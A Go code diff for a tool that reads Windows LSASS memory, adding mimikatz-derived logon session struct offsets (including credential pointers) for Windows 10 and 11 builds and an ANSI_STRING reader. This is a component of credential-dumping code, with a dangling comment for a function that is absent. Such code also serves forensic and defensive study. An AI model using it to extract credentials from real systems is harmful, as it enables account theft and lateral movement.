@@ -39,11 +39,11 @@ type logonSessionLayout struct {
 	UnicodeStringMax uint32 // hard cap for LSA_UNICODE_STRING.Length to filter garbage reads
 }
 
-// LayoutWin10W8 is the KIWI_MSV1_0_LIST_63 layout used by mimikatz for
-// Win10 21H2 — Win11 23H2 (matches LogonSessionListSignature in
-// lsass_logonlist.go). Field offsets cross-checked against mimikatz
-// modules/kuhl_m_sekurlsa.h KIWI_MSV1_0_LIST_63.
-var LayoutWin10W8 = logonSessionLayout{
+// LayoutWin10New is the KIWI_MSV1_0_LIST_63 layout for Win10 21H2+ / Win11
+// (builds >= 19041). These builds add extra unknown fields between Domain
+// and Type, shifting all subsequent offsets by 0x40 compared to the
+// original KIWI_MSV1_0_LIST_63 layout.
+var LayoutWin10New = logonSessionLayout{
 	Name:             "Win10_21H2_Win11_23H2",
 	NodeReadSize:     0x180,
 	LUIDOffset:       0x70,
@@ -53,9 +53,27 @@ var LayoutWin10W8 = logonSessionLayout{
 	LogonTypeOffset:  0x118,
 	LogonServerOff:   0x128,
 	CredentialsOff:   0x138,
-	UnicodeStringMax: 1024, // usernames/domains/server names well under this
+	UnicodeStringMax: 1024,
 }
 
+// LayoutWin10Original is the original KIWI_MSV1_0_LIST_63 layout for
+// Win10 1507–1909 / Server 2016 / Server 2019 (builds < 19041).
+// Offsets match the mimikatz kuhl_m_sekurlsa_utils.h struct definition.
+var LayoutWin10Original = logonSessionLayout{
+	Name:             "Win10_1507_Server2019",
+	NodeReadSize:     0x140,
+	LUIDOffset:       0x70,
+	UserNameOffset:   0x90,
+	DomainOffset:     0xa0,
+	TypeOffset:       0xc0,
+	LogonTypeOffset:  0xd8,
+	LogonServerOff:   0xf8,
+	CredentialsOff:   0x108,
+	UnicodeStringMax: 1024,
+}
+
+// layoutForVariant selects the correct logon session struct layout based
+// on the matched LogonSessionList signature variant name.
 // lsaUnicodeStringHeaderSize is the on-disk size of a LSA_UNICODE_STRING on
 // x64: USHORT Length + USHORT MaxLen + 4-byte padding + PWCH Buffer.
 const lsaUnicodeStringHeaderSize = 16
@@ -111,6 +129,37 @@ func readLSAUnicodeString(r lsassReader, raw []byte, fieldOffset int, sanityMaxB
 		return "", fmt.Errorf("read LSA_UNICODE_STRING.Buffer at 0x%X (%d bytes): %w", buffer, length, err)
 	}
 	return utf16LEToString(bytes), nil
+}
+
+// readAnsiString parses an ANSI_STRING header (same binary layout as
+// LSA_UNICODE_STRING on x64: USHORT Length, USHORT MaxLen, pad, PCHAR Buffer)
+// and reads the string data as raw bytes interpreted as ASCII. Unlike
+// readLSAUnicodeString, odd-length values are valid since ANSI is single-byte.
+func readAnsiString(r lsassReader, raw []byte, fieldOffset int, sanityMaxBytes uint32) (string, error) {
+	if r == nil {
+		return "", fmt.Errorf("nil lsassReader")
+	}
+	if fieldOffset < 0 || fieldOffset+lsaUnicodeStringHeaderSize > len(raw) {
+		return "", fmt.Errorf("ANSI_STRING field at offset 0x%X falls outside captured node (size %d)", fieldOffset, len(raw))
+	}
+	length, maxLength, buffer, err := parseLSAUnicodeStringHeader(raw[fieldOffset : fieldOffset+lsaUnicodeStringHeaderSize])
+	if err != nil {
+		return "", err
+	}
+	if length == 0 || buffer == 0 {
+		return "", nil
+	}
+	if length > maxLength {
+		return "", fmt.Errorf("ANSI_STRING.Length=%d exceeds MaximumLength=%d", length, maxLength)
+	}
+	if uint32(length) > sanityMaxBytes {
+		return "", fmt.Errorf("ANSI_STRING.Length=%d exceeds sanity cap %d", length, sanityMaxBytes)
+	}
+	bytes, err := r.Read(buffer, uint32(length))
+	if err != nil {
+		return "", fmt.Errorf("read ANSI_STRING.Buffer at 0x%X (%d bytes): %w", buffer, length, err)
+	}
+	return string(bytes), nil
 }
 
 // readLSAUnicodeRawBytes parses an LSA_UNICODE_STRING header at raw[fieldOffset:],
